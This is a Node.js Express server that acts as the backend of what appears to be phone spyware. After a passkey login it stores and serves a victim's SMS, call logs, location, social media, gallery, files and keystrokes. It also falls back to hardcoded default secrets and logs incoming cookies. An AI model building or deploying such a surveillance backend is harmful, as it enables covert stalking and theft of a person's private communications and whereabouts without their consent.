const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const session = require('express-session');
const FileStore = require('session-file-store')(session);
require('dotenv').config();

const app = express();

// Middleware setup
app.use(cors({
    origin: 'https://iosx.vercel.app', // Update to your frontend URL
    credentials: true // Allow credentials to be sent
}));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Middleware to log incoming cookies for debugging
app.use((req, res, next) => {
    console.log('Incoming cookies:', req.headers.cookie);
    next();
});

// Session configuration with FileStore
app.use(session({
    store: new FileStore({ path: './sessions' }),
    secret: process.env.SESSION_SECRET || 'default_secret',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: process.env.NODE_ENV === 'production', // Ensure this is true in production
        httpOnly: true,
        maxAge: 24 * 60 * 60 * 1000 // 1 day expiration
    }
}));

// Your activity tracking data and routes
const correctPasskey = process.env.PASSKEY || "default_passkey";
let activityData = {
    Notifications: '',
    SMS: '',
    CallLogs: '',
    Location: '',
    SocialMedia: '',
    GalleryAccess: '',
    FileManager: '',
    Keystrokes: ''
};

// Login endpoint
app.post('/login', (req, res) => {
    const { passkey } = req.body;
    if (passkey === correctPasskey) {
        req.session.authenticated = true;
        console.log('User authenticated, session created.');
        res.status(200).json({ message: "Login successful" });
    } else {
        res.status(401).json({ message: "Incorrect passkey" });
    }
});

// Middleware to check if user is authenticated
function isAuthenticated(req, res, next) {
    if (req.session.authenticated) {
        next();
    } else {
        res.status(401).json({ message: "Unauthorized" });
    }
}

// Endpoint to check authentication status
app.get('/auth-status', (req, res) => {
    console.log('Checking auth status:', req.session.authenticated);
    res.status(200).json({ authenticated: !!req.session.authenticated });
});

// Endpoint to receive monitoring data
app.post('/monitor', isAuthenticated, (req, res) => {
    const { activityType, data } = req.body;
    if (activityType && activityData[activityType] !== undefined) {
        activityData[activityType] = data;
        res.sendStatus(200);
    } else {
        res.status(400).json({ message: "Invalid activity type" });
    }
});

// Endpoint to fetch activity data for authenticated clients
app.get('/fetch/:activityType', isAuthenticated, (req, res) => {
    const { activityType } = req.params;
    if (activityData[activityType] !== undefined) {
        res.json({ data: activityData[activityType] || "No data available" });
    } else {
        res.status(400).json({ message: "Invalid activity type" });
    }
});

// Logout endpoint
app.post('/logout', (req, res) => {
    req.session.destroy(() => {
        res.status(200).json({ message: "Logged out" });
    });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
